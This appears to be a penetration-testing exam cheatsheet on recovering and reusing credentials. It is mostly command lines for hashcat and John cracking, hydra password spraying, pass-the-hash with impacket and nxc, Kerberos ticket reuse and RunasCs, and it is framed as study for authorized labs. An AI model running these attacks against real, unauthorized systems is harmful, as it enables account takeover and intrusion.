    10.8 Credentials and Cracking Cheatsheet

    ← Cheatsheet index | Full procedure | Strategy map | Study methods: Recover and use authentication material

    source -> format -> identity/context -> compatible use -> authentication
-> authorization -> new access -> re-enumerate

    10.8.1 Classify

    hashid HASH_OR_FILE
john --list=formats | grep -i KEYWORD
hashcat --example-hashes | less
    MaterialDo not confuse it withNext action
    NT hashNet-NTLMv2 responseCrack mode 1000 or compatible NTLM PtH
    Net-NTLMv2Reusable NT hashCrack mode 5600 or authorized relay conditions
    DCC2/MSCache v2NT hashOffline recovery with username; not ordinary PtH
    .kirbi/ccachePassword/hashValidate ticket, SPN, time and service
    SSH keyPasswordFix permissions; crack only its passphrase if protected
    KeePass/ZIP/PDF/OfficeRaw passwordConvert with matching *2john tool

    10.8.2 Validate one known credential

    ssh -o PreferredAuthentications=password -p PORT USER@TARGET
nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares
nxc smb TARGET --local-auth -u USER -p 'PASSWORD' --shares
evil-winrm -i TARGET -u USER -p 'PASSWORD'
xfreerdp /v:TARGET /u:'DOMAIN\USER' /p:'PASSWORD' /cert:ignore

    Login accepted proves authentication to that service. Shares, sessions, execution and administrator rights are separate authorization claims.

    10.8.3 Authorized online dictionary/spray

    10.8.3.1 one known user, candidate passwords

    # one known user, candidate passwords
hydra -l USER -P WORDLIST -s PORT -t 4 -f ssh://TARGET

    10.8.3.2 one password, candidate users

    # one password, candidate users
hydra -L USERS -p 'PASSWORD' -s PORT -t 1 rdp://TARGET

    HTTP form after capturing the real request and failure marker:

    hydra -l USER -P WORDLIST TARGET http-post-form \
  '/LOGIN_PATH:username=^USER^&password=^PASS^:F=STABLE_FAILURE_TEXT'

    Check lockout/rate controls first and manually confirm tool hits. Dynamic CSRF/cookies and weak condition strings require manual handling.

    10.8.4 Hashcat

    Use the identified verifier format and a feasible offline candidate strategy.     
    hashcat -b -m MODE
hashcat -a 0 -m MODE hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule --session job
hashcat -m MODE hashes.txt --show
hashcat -r /usr/share/hashcat/rules/best64.rule --stdout wordlist.txt | head

    10.8.4.1 known pattern

    # known pattern
hashcat -a 3 -m MODE hashes.txt '?u?l?l?l?l?d?d?d' --session mask-job

    10.8.4.2 word plus three digits

    # word plus three digits
hashcat -a 6 -m MODE hashes.txt wordlist.txt '?d?d?d' --session hybrid-job

    10.8.4.3 resume

    # resume
hashcat --session job --restore

    -a 0 is dictionary mode; -a 3 expects a mask, not a wordlist. Measure the actual mode before attempting a large keyspace.

    # confirm modes locally
hashcat -h | grep -Ei 'NTLM|NetNTLMv2|KeePass|OpenSSH|Kerberos'

    Common current mappings: NTLM 1000, Net-NTLMv2 5600, KeePass 13400, AS-REP etype 23 18200, TGS etype 23 13100. Installed help/example hashes win.

    10.8.5 John

    Use the identified verifier format and a feasible offline candidate strategy.     
    john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
john --format=FORMAT --wordlist=wordlist.txt --rules=Jumbo hash.txt
john --session=job --wordlist=wordlist.txt hash.txt
john --restore=job

    10.8.6 Convert protected files

    zip2john archive.zip > archive.hash
ssh2john id_rsa > ssh.hash
keepass2john vault.kdbx > keepass.hash
pdf2john document.pdf > pdf.hash
office2john document.docx > office.hash
rar2john archive.rar > rar.hash
7z2john archive.7z > 7z.hash
unshadow passwd.copy shadow.copy > linux.hash

    10.8.7 SSH key

    chmod 600 id_rsa
ssh-keygen -y -f id_rsa > derived.pub
ssh -vv -i id_rsa -o IdentitiesOnly=yes -p PORT USER@TARGET

    # protected key recovery
ssh2john id_rsa > ssh.hash
john --wordlist=wordlist.txt --rules=Jumbo ssh.hash
john --show ssh.hash

    Key unlock and server authorization are separate. Permission denied (publickey) can occur after the passphrase was correct.

    10.8.8 Linux password records

    unshadow passwd.copy shadow.copy > linux.hash
john --wordlist=wordlist.txt --rules=Jumbo linux.hash
john --show linux.hash

    10.8.9 Pass-the-hash

    nxc smb TARGET -d DOMAIN -u USER -H NT_HASH --shares
impacket-wmiexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
xfreerdp /v:TARGET /u:'DOMAIN\USER' /pth:NT_HASH /cert:ignore

    Authentication ≠ remote authorization. Re-enumerate every service/share/right after a successful identity transition. Responder spoofing is prohibited on the OSCP+ exam; keep capture/relay work to explicitly authorized labs.

    10.8.10 Net-NTLMv2 and DCC2

    hashcat -a 0 -m 5600 netntlmv2.hash wordlist.txt
john --format=netntlmv2 --wordlist=wordlist.txt netntlmv2.hash
john --format=mscash2 --wordlist=wordlist.txt dcc2.hash

    Neither is a reusable NT hash. Net-NTLMv2 relay is a separate live exchange; DCC2 preserves username-dependent context.

    10.8.11 Kerberos ticket/cache

    klist
KRB5CCNAME=TICKET.ccache klist
impacket-ticketConverter TICKET.kirbi TICKET.ccache
export KRB5CCNAME=TICKET.ccache
impacket-wmiexec -k -no-pass 'DOMAIN/USER@HOST.DOMAIN'

    Check principal, realm, TGT/TGS type, SPN, validity, clock, DNS/FQDN, route and service rights.

    10.8.12 Failure router

    SymptomNext action
    Timeout/refusedFix route/service before judging material
    Local/domain login failsRecheck identity context and supported auth method
    Parser/token errorRecheck complete format, converter, mode and tool version
    Auth succeeds, access deniedPreserve valid identity; enumerate authorization
    SSH key unlocks, server rejectsRecheck user/server/authorized key/policy
    Ticket loads, service rejectsCheck expiry, SPN, realm, clock and DNS
    PtH authenticates, execution failsCheck admin rights, UAC restrictions and method prerequisites

    10.8.13 Re-enumerate

    identity -> groups/roles -> services -> shares/files -> application features
-> accessible hosts/routes -> new credentials/tickets/sessions -> next block

    10.8.14 Use a known password from a Windows foothold

    Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.

    Run a reviewed RunasCs build on the current Windows host with the intended account scope. It accepts a plaintext password, not an NT hash.

    REM Domain account: inspect the resulting token
RunasCs.exe USER PASSWORD "cmd /c whoami /all" -d DOMAIN
REM Local account on this host
RunasCs.exe USER PASSWORD "cmd /c whoami /all"
REM Network-only: local identity stays unchanged; inspect the remote result
RunasCs.exe USER PASSWORD "cmd /c dir \\TARGET\SHARE" -d DOMAIN -l 9

    With logon type 9, whoami does not validate the outbound password. An authentication success is separate from resource authorization or an elevated token. Full credential-use procedure.

    10.8.15 Discover and recognize candidates

    Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries.

    10.8.15.1 Recover and use authentication material

    10.8.15.1.1 Find: Classify the artifact and its identity context

    Return to the file, database row, capture or session that produced the artifact; inspect structure and account labels before choosing a tool mode.

    file FILE
head -c 160 FILE

    Recognize: Headers and producing context distinguish a private key, challenge response and stored NT verifier.

    Validate next: Record the exact source, user/domain and complete format; identify compatible recovery/authentication operations.

    Classify the artifact and its identity context.

    10.8.15.1.2 Find: Validate known passwords and context-specific reuse

    Use the account label from the producing source and the observed service inventory to choose one compatible, correctly qualified validation.

    nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD'

    Recognize: Accepted authentication proves one service/account pairing; it does not establish shares, administration, RDP or WinRM.

    Validate next: Qualify local/domain/application identity explicitly, test a compatible reachable service and record the accepted identity. Then test the specific share/logon/execution right; successful authentication is not administrative authorization.

    Validate known passwords and context-specific reuse.

    10.8.15.1.3 Find: Recover passwords with feasible dictionary, rule and mask attacks

    Identify a supported verifier/converter and build candidate structure from relevant names/policy/context rather than selecting an arbitrary hash mode.

    hashcat --example-hashes
john --list=formats

    Recognize: A verified format and feasible candidate model enable offline recovery; a hash-shaped string alone does not.

    Validate next: Check complete salt/context, conversion correctness, tool backend and whether all required factors are present.

    Recover passwords with feasible dictionary, rule and mask attacks.

    10.8.15.1.4 Find: Recover a protected KeePass database password

    Look for a vault in readable backups/shares/application data, then inspect file identity and nearby factor/configuration references.

    file FILE
keepass2john FILE > keepass.hash

    Recognize: A supported database gives a recovery target, but a referenced key file indicates a separate factor.

    Validate next: Confirm vault version, required key/account factors and a feasible password search.

    Recover a protected KeePass database password.

    10.8.15.1.5 Find: Inspect and recover SSH private-key access

    Trace readable key files from home/configuration/backups to a specific username; inspect the key parser's response before testing the server.

    file KEY
ssh-keygen -y -f KEY

    Recognize: The artifact is a private key protected by a local passphrase; this is separate from the SSH account password.

    Validate next: Determine the protecting passphrase, associated remote user, accepted algorithm and server key authorization.

    Inspect and recover SSH private-key access.

    10.8.15.1.6 Find: Recover Linux account passwords from matched records

    Inspect permission-backed account backups or privileged read results; associate shadow verifiers with the matching passwd metadata.

    file passwd.txt shadow.txt
head -n 3 passwd.txt
head -n 3 shadow.txt

    Recognize: The matching account name and verifier prefix identify an offline password-recovery candidate.

    Validate next: Confirm snapshots, hash format and account state; a locked field or absent salt is not a normal usable verifier.

    Recover Linux account passwords from matched records.

    10.8.15.1.7 Find: Recover or reuse an NT password hash

    Inspect the output schema of a justified local/domain credential source, keeping RID, machine and domain labels.

    head -n 3 hashes.txt

    Recognize: The source and record fields identify an NT verifier for that local account, not a captured challenge response.

    Validate next: Verify the actual NT field, account scope and an accepting service/client with the required destination right.

    Recover or reuse an NT password hash.

    10.8.15.1.8 Find: Recover a password from a captured NTLM response

    Use the saved authorized capture's structure and source context; inspect username/domain/challenge/response fields before selecting recovery.

    head -n 2 responses.txt

    Recognize: A challenge-bound response supports its appropriate offline verification workflow; it is not the long-term NT hash.

    Validate next: Check complete capture format, account mapping and feasible candidates; acquisition/relay policy is a separate issue.

    Recover a password from a captured NTLM response.

    10.8.15.1.9 Find: Recover a password from cached domain logon verifiers

    Inspect SECURITY/SYSTEM parser output and distinguish cached-domain logon verifiers from local SAM hashes and service secrets.

    head -n 3 dcc2.txt

    Recognize: The DCC2 structure and username-associated derivation identify offline cached-logon material.

    Validate next: Verify iteration/username context, source consistency and current online account state after any recovery.

    Recover a password from cached domain logon verifiers.

    10.8.15.1.10 Find: Classify tickets and use a compatible cache

    Inspect an existing ticket/cache before collecting new material; identify its client, service, realm and validity.

    klist -c FILE

    Recognize: This is service-scoped CIFS material, not a TGT for requesting arbitrary services.

    Validate next: Check lifetime, cache format, exact SPN/name, route and destination object authorization.

    Classify tickets and use a compatible cache.
